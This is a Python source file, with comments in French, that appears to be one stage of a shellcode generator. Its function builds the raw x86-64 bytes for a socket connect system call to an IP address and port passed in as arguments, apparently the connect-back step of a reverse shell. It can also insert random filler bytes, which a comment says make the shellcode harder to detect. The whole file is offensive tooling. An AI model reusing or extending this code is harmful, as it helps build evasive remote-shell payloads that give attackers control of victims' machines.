#!/usr/bin/env python3
import random
from func_instru import *

def partie2(port, ip, fullrdm):

    # PARTIE : SOCKET - CONNEXION SOCKET
    ## Exemple de code asm : 
    """
	sub rsp, 8
	mov BYTE[rsp],0x2
	mov WORD[rsp+0x2],0x5c11
	mov DWORD[rsp+0x4], 0x100007f ; 127.0.0.1
	mov rsi, rsp
	mov dl, 16
	push r8
	pop rdi
	mov al, 42
	syscall
    """


    subrsp = '\\x48\\x83\\xec\\x08' # sub rsp, 8
    movb = movx('b', 2) # mov BYTE[rsp],0x2 - (ou équivalent)
    movw1 = f'\\x66\\xc7\\x44\\x24\\x02\\{port}' # mov WORD[rsp+0x2], {PORT HEXA Little IDIAN}
    movl = f'\\xc7\\x44\\x24\\x04\\{ip}' # movl $0x100007f,0x4(%rsp)
    movrsi = movregx('rsi', 'e6') # mov rsi, rsp - (ou équivalent)
    movdl = movx('dl', 16) # mov dl, 16 - (ou équivalent)
    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    moval = movx('al', 42) # mov al, 42 - (ou équivalent)
    syscall = '\\x0f\\x05' # syscall
    
    # Concaténation de toutes les variables
    resultat_concat = subrsp + movb + movw1 + movl + movrsi + movdl + pushr8 + poprdi + moval + syscall


    # Ajout d'aléatoire si l'argument --random = yes
    ### Cette section brise certains motifs pour rendre le shellcode plus difficile à détecter.
    if fullrdm == 'yes':

        y = random.randint(0, 3)

        match y : 
            case 1 :
                resultat_concat = subrsp + full_random() + movb + movw1 + movl + movrsi + movdl + pushr8 + poprdi + moval + syscall
            case 2 : 
                resultat_concat = subrsp + full_random()  + movb + movw1 + full_random() + movl + movrsi + movdl + pushr8 + poprdi + moval + syscall
            case 3 :
                resultat_concat = subrsp + full_random() + movb + full_random()  + movw1 + movl + movrsi + full_random() + movdl + pushr8 + poprdi + moval + syscall
    
    return resultat_concat  
